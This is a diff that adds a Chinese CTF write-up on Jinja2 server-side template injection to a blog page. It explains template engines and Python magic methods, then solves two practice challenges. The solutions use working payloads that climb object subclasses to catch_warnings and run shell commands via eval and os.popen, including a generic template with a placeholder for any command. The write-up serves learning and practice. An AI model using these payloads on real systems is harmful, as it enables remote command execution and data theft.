@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>寒假练习26 - Hexo</title>
+<title>寒假练习26——ssti模板注入 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -153,14 +153,115 @@
                 </p>
                 <p>一个写代码的「伪文人」</p>
             </div>
-            <h2 class="post-title">寒假练习26</h2>
+            <h2 class="post-title">寒假练习26——SSTI模板注入</h2>
             <div class="post-meta">
-                emm... 0 words in the article |
+                emm... 8461 words in the article |
                 you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
         <div class="post-content markdown-body">
-            
+            <p>最近有点懒，发现很久没有更新新题目了，最进学了一个新的知识点，赶紧来凭借最近做的两道题目巩固一下。  </p>
+<h1 id="一、-BJDCTF-2nd-fake-google-1"><a href="#一、-BJDCTF-2nd-fake-google-1" class="headerlink" title="一、[BJDCTF 2nd]fake google 1"></a>一、[BJDCTF 2nd]fake google 1</h1><p>打开这道题目，发现是一个谷歌界面。让我们输入内容。<br><img src="https://i.loli.net/2021/02/21/58tEAZYQmVzeOIb.png" alt="18.png"><br>随便输入个数字，发现直接给我们回显出来了。<br><img src="https://i.loli.net/2021/02/21/mTfeAsw7M82NFDQ.png" alt="19.png"><br>并且通过网址栏可以可看出是以get方式来传参变量name。  </p>
+<p>一开始我以为这还是个sql注入题目，但是我发现无论如何输入都是给我原封不动的回显回来，看来他考的并不是这个，那么就是一个新的知识点了。  </p>
+<h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>从注入两个字可以看出它和sql注入肯定有相似地方的，确实如此，下面简单讲解一下。  </p>
+<h3 id="1、什么是SSTI"><a href="#1、什么是SSTI" class="headerlink" title="1、什么是SSTI"></a>1、什么是SSTI</h3><p>SSTI，服务器端模板注入(Server-Side Template Injection)</p>
+<pre><code>服务端接收攻击者的输入，将其作为Web应用模板内容的一部分
+在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容
+从而导致信息泄露、代码执行、GetShell等问题
+其影响范围主要取决于模版引擎的复杂性</code></pre>
+<p>注意：模板引擎 和 渲染函数 本身是没有漏洞的 , 该漏洞的产生原因在于程序员对代码的不严禁与不规范 , 导致了模板可控 , 从而引发代码注入</p>
+<p>主要的框架</p>
+<pre><code>Python：jinja2、 mako、 tornado、 django
+php：smarty、 twig
+java：jade、 velocity  </code></pre>
+<h3 id="2、模板引擎"><a href="#2、模板引擎" class="headerlink" title="2、模板引擎"></a>2、模板引擎</h3><p>看完这个解释后我们来先讲一下什么是模板引擎。<br>简而言之，这个就相当于一个模子，它会生成一套html代码，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。具体如下图。<br><img src="https://i.loli.net/2021/02/21/tSZ5gD42blRhMNT.png" alt="20.png"><br>其中渲染是由渲染函数完成的。  </p>
+<p>举个例子。render_template_string() 函数就是一个用于渲染函数，它可以渲染一个字符串，通过上图可以知道，当我们输入字符串后，它会和模板文件，也就是一套html代码拼接起来，然后进行渲染，最后呈现到html页面上。  </p>
+<p>拿这道题目来说，我们输入123，这个字符串就和一套代码拼接起来了，根据回显的结果可以推测出来这套代码执行的是返回P3’s girlfirend is : +“我们输入的内容”的命令。经过拼接和渲染后呈现给我们的界面就是P3’s girlfirend is : 123这样的字符。   </p>
+<pre><code>其实换一个角度来想，模板引擎就相当于PPT中的背景样式，当我们采用了一种背景形式后，我们只需输入我们的内容，最后所有PPT呈现出来的都是这个背景加上内容，而不需要我们专门找背景再一张张PPT设置了。  </code></pre>
+<h3 id="3、注入原理"><a href="#3、注入原理" class="headerlink" title="3、注入原理"></a>3、注入原理</h3><p>了解完模板引擎和渲染后，漏洞在哪里呢？<br>当我们输入{ {7*7} }后，我们会发现他并不是原样返回了。而是返回了49这个数字。<br><img src="https://i.loli.net/2021/02/21/fB5NqozGQw7CHF3.png" alt="21.png"><br>很明显，{ {—-} }中的语句被执行了。<br>这是因为在flask中，渲染引擎Jinja2会将{ { — } }视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行<br>那么，如果我们传入的参数内容为{ { — } }包裹的代码，这些代码就会被执行。  </p>
+<p>看到这里是不是发现{ {—} }里的代码和sql的注入语句有些相似?它们都是通过传参来执行一些语句。    </p>
+<p>但是虽然我们能够执行代码，但由于模板本身的沙盒安全机制，某些语句虽然可以执行，却不会执行成功，也就是说，虽然我们可以执行系统命令语句，(比如ls查看目录，cat查看文件等等)但是它并不会执行成功，这就是因为沙盒机制严格地限制了程序的行为。  </p>
+<p>那么我们如何绕过这个机制呢？这里要用到魔术方法，并且有一套方法。<br><img src="https://i.loli.net/2021/02/21/KR83Q1NJWb4dtuL.png" alt="22.png">   </p>
+<p>一些内建魔术方法如下<br><img src="https://i.loli.net/2021/02/21/K5ItBfLScNZAvx6.png" alt="23.png">  </p>
+<pre><code>__class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。
+
+1&gt;&gt;&gt; &#39;&#39;.__class__
+&lt;type &#39;str&#39;&gt;
+2&gt;&gt;&gt; ().__class__
+&lt;type &#39;tuple&#39;&gt;
+3&gt;&gt;&gt; [].__class__
+&lt;type &#39;list&#39;&gt;
+4&gt;&gt;&gt; &#123;&#125;.__class__
+&lt;type &#39;dict&#39;&gt;
+
+__ bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值
+
+1&gt;&gt;&gt; ().__class__.__bases__
+(&lt;type &#39;object&#39;&gt;,)
+2&gt;&gt;&gt; &#39;&#39;.__class__.__bases__
+(&lt;type &#39;basestring&#39;&gt;,)
+3&gt;&gt;&gt; [].__class__.__bases__
+(&lt;type &#39;object&#39;&gt;,)
+4&gt;&gt;&gt; &#123;&#125;.__class__.__bases__
+(&lt;type &#39;object&#39;&gt;,)
+5&gt;&gt;&gt; [].__class__.__bases__[0]
+&lt;type &#39;object&#39;&gt;
+
+__mro__：也可以获取基类
+
+1&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+2&gt;&gt;&gt; [].__class__.__mro__
+(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+3&gt;&gt;&gt; &#123;&#125;.__class__.__mro__
+(&lt;class &#39;dict&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+4&gt;&gt;&gt; ().__class__.__mro__
+(&lt;class &#39;tuple&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+5&gt;&gt;&gt; ().__class__.__mro__[1]            # 使用索引就能获取基类了
+&lt;class &#39;object&#39;&gt;
+
+__subclasses__()：查看当前类的子类。
+
+&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
+[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;sys.getwindowsversion&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;nt.stat_result&#39;&gt;, &lt;type &#39;nt.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;functools.partial&#39;&gt;, &lt;type &#39;MultibyteCodec&#39;&gt;, &lt;type &#39;MultibyteIncrementalEncoder&#39;&gt;, &lt;type &#39;MultibyteIncrementalDecoder&#39;&gt;, &lt;type &#39;MultibyteStreamReader&#39;&gt;, &lt;type &#39;MultibyteStreamWriter&#39;&gt;]   </code></pre>
+<p>介绍完这些魔术方法的运用后再讲一下引擎的判断，因为模板引擎分很多种，因为不同引擎支持的语句也不同，引擎的判断其实挺简单的，下面附上一张图。<br><img src="https://i.loli.net/2021/02/21/hVcfBTGsFiPR9O4.png" alt="26.png"><br><strong>绿色为执行成功，红色为执行失败</strong>  </p>
+<pre><code>**另：&#123; &#123;7*&#39;7&#39;&#125; &#125;在Twig中返回49，在Jinja2中返回77777777**</code></pre>
+<p>这张图还是比较清晰的。<br>这道题目的引擎是jinja2，一般来说，大多数题目都是这个引擎。  </p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>知道了SSTI后，我们来看这道题目。已经知道这道题目是SSTI注入，那么我们就一步步来吧。  </p>
+<p>按照上面的流程。<br>1、获取字符串的类对象  </p>
+<blockquote>
+<p>{ {‘’.__class __} }</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/21/zHrt2Th6oyYGQEC.png" alt="23.png"><br>2、寻找基类  </p>
+<blockquote>
+<p>{ {‘’.__class __. __mro __} }</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/21/YL1QU4gA9BlWjFN.png" alt="1.png"><br>3、寻找可用引用，也就是可以引用os模块的子类，warnings.catch_warnings。引用这个模块可以执行系统命令。从而查询我们想要的文件。还有一个file类，也可以读文件。<br>可以引用的类其实很多。<br>object是所有类的父类，所以我们选择object来查看有什么我们是可以引用的。  </p>
+<blockquote>
+<p>{ {‘’.__ class <strong>.</strong> mro __[1]. __subclasses __()} }  </p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/21/SuGcEKVJRxBAjQZ.png" alt="2.png"><br>好家伙，有这么多，我们要找到可以引用os模块的子类。也就是warnings.catch_warnings。<br>发现它在169位。接下来就是构造命令来执行。来查flag。  </p>
+<pre><code>&#123; &#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__ import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&quot;)&#125; &#125;    
+
+__init__ 类的初始化方法
+__globals__ 对包含函数全局变量的字典的引用
+__bases__ 返回该对象所继承的基类 __builtins__是作为默认初始模块
+builtins指的是python的内置函数，如eval(),chr()等</code></pre>
+<p>其实这个payload差不多都是固定，只有个别地方有调整。还是要多积累。   </p>
+<p>还有一个jinja2引擎通用的payload。  </p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </code></pre>
+<p>&lt; command &gt;里填入要执行的命令。（tql）</p>
+<p>这样就完成了SSTI注入。  </p>
+<h1 id="二、Do-You-like-Python"><a href="#二、Do-You-like-Python" class="headerlink" title="二、Do_You_like_Python?"></a>二、Do_You_like_Python?</h1><p>这是一个新手赛里的题目，也是SSTI注入。<br>打开题目，发现就是一个提交栏。<br><img src="https://i.loli.net/2021/02/22/KoTs4ciSymk2hu1.png" alt="4.png"><br>输入{ {7*’7’} },发现返回7777777，说明这是jinja2引擎。  </p>
+<p>直接上通用的payload。  </p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;   </code></pre>
+<p>查看目录。<br><img src="https://i.loli.net/2021/02/22/uRqYDBLUfIJcKQr.png" alt="5.png"><br>接着查看flag文件。  </p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </code></pre>
+<p>还是这个简单省事。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实SSTI注入和sql注入很相似，都是通过执行一些相关语句来查看相关信息。也都有自己的一套流程。按部就班不难，难的是如何灵活应用魔法方法，和绕过一些限制，从而引用os模块或者可以利用的子类。  </p>
+<p>SSTI注入的payload很多，要多积累，有时候有的payload是无效的，原因还不清楚。。。。。。。  </p>
+<p>下面附上学习博客。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/109048578?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161381046216780265420418%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161381046216780265420418&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-109048578.first_rank_v2_pc_rank_v29&utm_term=SSTI%E5%8E%9F%E7%90%86">SSTI详解 一文了解SSTI和所有常见payload 以flask模板为例</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/yh1013024906/article/details/84330056?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161381046216780265420418%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161381046216780265420418&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-84330056.first_rank_v2_pc_rank_v29&utm_term=SSTI%E5%8E%9F%E7%90%86">FLASK模板注入 （SSTI）</a></p>
+
             
                 
 
